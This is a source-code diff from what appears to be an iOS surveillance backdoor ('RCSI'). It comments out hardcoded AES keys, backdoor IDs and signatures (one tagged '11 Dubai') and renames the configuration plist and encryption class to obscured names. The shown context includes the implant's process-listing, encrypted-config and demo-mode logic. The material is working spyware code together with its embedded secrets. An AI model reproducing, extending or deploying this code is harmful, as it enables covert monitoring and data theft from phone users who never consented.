@@ -19,45 +19,46 @@
 #import "RCSIEncryption.h"
 #import "RCSICommon.h"
 
+#import "RCSIGlobals.h"
 //#define DEBUG
 
 FILE *logFD = NULL;
 
-#ifndef DEV_MODE
-char  gLogAesKey[]      = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // default
-#else
-char  gLogAesKey[]      = "9797DE1BD45444B171B9D6CCE6E0CB45"; // 11 Dubai
-#endif
-
-#ifndef DEV_MODE
-char  gConfAesKey[]     = "Adf5V57gQtyi90wUhpb8Neg56756j87R"; // default
-#else
-char  gConfAesKey[]     = "2A61DC73B553402F804FB0D0036C632F"; //
-#endif
-
-// Instance ID (20 bytes) unique per backdoor/user
-char gInstanceID[]      = "37E63B54CDFB1EA1E99BCD5CD9A72DD00272BD75"; // generated
-
-// Backdoor ID (16 bytes) (NULL terminated)
-#ifndef DEV_MODE
-char gBackdoorID[]      = "av3pVck1gb4eR2d8";
-#else
-char gBackdoorID[]      = "RCS_0000000011"; // 11 Dubai
-#endif
-
-// Challenge Key aka signature
-#ifndef DEV_MODE
-char gBackdoorSignature[]       = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default
-#else
-char gBackdoorSignature[]       = "MPMxXyD6fUfaWaIOia4X+koq7BtXXj3o"; 
-#endif
-
-// Demo marker: se la stringa e' uguale a "hxVtdxJ/Z8LvK3ULSnKRUmLE"
-// allora e' in demo altrimenti no demo.
-char gDemoMarker[] = "hxVtdxJ/Z8LvK3ULSnKRUmLE";
-
-// Configuration Filename encrypted within the first byte of gBackdoorSignature
-char gConfName[]    = "c3mdX053du1YJ541vqWILrc4Ff71pViL";
+//#ifndef DEV_MODE
+//char  gLogAesKey[]      = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // default
+//#else
+//char  gLogAesKey[]      = "9797DE1BD45444B171B9D6CCE6E0CB45"; // 11 Dubai
+//#endif
+//
+//#ifndef DEV_MODE
+//char  gConfAesKey[]     = "Adf5V57gQtyi90wUhpb8Neg56756j87R"; // default
+//#else
+//char  gConfAesKey[]     = "2A61DC73B553402F804FB0D0036C632F"; //
+//#endif
+//
+//// Instance ID (20 bytes) unique per backdoor/user
+//char gInstanceID[]      = "37E63B54CDFB1EA1E99BCD5CD9A72DD00272BD75"; // generated
+//
+//// Backdoor ID (16 bytes) (NULL terminated)
+//#ifndef DEV_MODE
+//char gBackdoorID[]      = "av3pVck1gb4eR2d8";
+//#else
+//char gBackdoorID[]      = "RCS_0000000011"; // 11 Dubai
+//#endif
+//
+//// Challenge Key aka signature
+//#ifndef DEV_MODE
+//char gBackdoorSignature[]       = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default
+//#else
+//char gBackdoorSignature[]       = "MPMxXyD6fUfaWaIOia4X+koq7BtXXj3o"; 
+//#endif
+//
+//// Demo marker: se la stringa e' uguale a "hxVtdxJ/Z8LvK3ULSnKRUmLE"
+//// allora e' in demo altrimenti no demo.
+//char gDemoMarker[] = "hxVtdxJ/Z8LvK3ULSnKRUmLE";
+//
+//// Configuration Filename encrypted within the first byte of gBackdoorSignature
+//char gConfName[]    = "c3mdX053du1YJ541vqWILrc4Ff71pViL";
 
 BOOL gIsDemoMode    = FALSE;
 BOOL gAgentCrisis   = NO;
@@ -77,8 +78,8 @@ u_int gOSMajor  = 0;
 u_int gOSMinor  = 0;
 u_int gOSBugFix = 0;
 
-// Core Version
-u_int gVersion      = 2012063001;
+//// Core Version
+//u_int gVersion      = 2012063001;
 
 int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
 {
@@ -497,8 +498,8 @@ NSArray *searchFile (NSString *aFileMask)
   return fileFound;
 }
 
-#define RCS_PLIST     @"rcsiphone.plist"
-#define RCS_PLIST_CLR @"rcsiphone_clr.plist"
+#define RCS_PLIST     @"_i_phone.plist"
+#define RCS_PLIST_CLR @"_i_phone_clr.plist"
 
 NSMutableDictionary *openRcsPropertyFile()
 {  
@@ -513,7 +514,7 @@ NSMutableDictionary *openRcsPropertyFile()
   NSData *keyData = [NSData dataWithBytes: gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
   
-  RCSIEncryption *rcsEnc = [[RCSIEncryption alloc] initWithKey: keyData];
+  _i_Encryption *rcsEnc = [[_i_Encryption alloc] initWithKey: keyData];
   NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
   [rcsEnc release];
   
@@ -614,7 +615,7 @@ BOOL setRcsPropertyWithName(NSString *name, NSDictionary *dictionary)
                                    length: CC_MD5_DIGEST_LENGTH];
 
   // Scrambled name
-  RCSIEncryption *rcsEnc = [[RCSIEncryption alloc] initWithKey: keyData];
+  _i_Encryption *rcsEnc = [[_i_Encryption alloc] initWithKey: keyData];
   NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
   [rcsEnc release];
 
@@ -903,8 +904,11 @@ void checkAndRunDemoMode()
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
   // precalc sha1 of "hxVtdxJ/Z8LvK3ULSnKRUmLE
-  char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
-                    "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
+  // char demoSha1[] = "\x31\xa2\x85\xaf\xb0\x43\xe7\xa0\x90\x49"
+  //                   "\x94\xe1\x70\x07\xc8\x26\x3d\x45\x42\x73";
+  
+  char demoSha1[] =   "\x4e\xb8\x75\x0e\xa8\x10\xd1\x94\xb4\x69"
+                      "\xf0\xaf\xa8\xf4\x77\x51\x49\x69\xba\x72";
   
   NSMutableData *isDemoMarker = [[NSMutableData alloc] initWithBytes: demoSha1 length: 20];
   
